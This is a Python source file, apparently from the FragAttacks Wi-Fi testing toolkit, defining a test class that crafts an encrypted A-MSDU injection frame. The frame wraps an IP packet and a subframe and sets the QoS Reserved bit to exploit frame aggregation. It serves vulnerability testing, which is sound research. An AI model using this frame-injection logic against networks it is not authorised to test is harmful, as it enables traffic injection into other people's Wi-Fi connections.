from fragattack import *

class AmsduAttack(Test):
	"""
	Inject a frame identical to the one the station would receive when performing
	the A-MSDU attack by injecting an IP packet with a specific identification field.
	"""

	def __init__(self, ptype, linux=False):
		super().__init__([Action(Action.Connected, Action.Inject, enc=True)])
		self.ptype = ptype
		self.linux = linux

	def prepare(self, station):
		log(STATUS, "Generating A-MSDU attack test frame", color="green")

		# Generate the header and payload
		header, request, self.check_fn = generate_request(station, self.ptype)

		# This checks if the to-DS is set (frame towards the AP) --- XXX Utility function for this?
		if header.FCfield & 1 != 0:
			src = station.mac
			dst = station.get_peermac()
		else:
			dst = station.peermac
			src = station.bss

		# Put the request inside an IP packet
		if not self.linux:
			p = header/LLC()/SNAP()/IP(dst="192.168.1.2", src="1.2.3.4", id=34)/TCP()
		else:
			p = header/LLC()/SNAP()/IP(dst="192.168.1.2", src="3.5.1.1")/Raw(b"A" * 768)
		p = p/create_msdu_subframe(src, dst, request, last=True)
		p[Dot11QoS].Reserved = 1

		# Schedule transmission of frame
		self.actions[0].frame = p

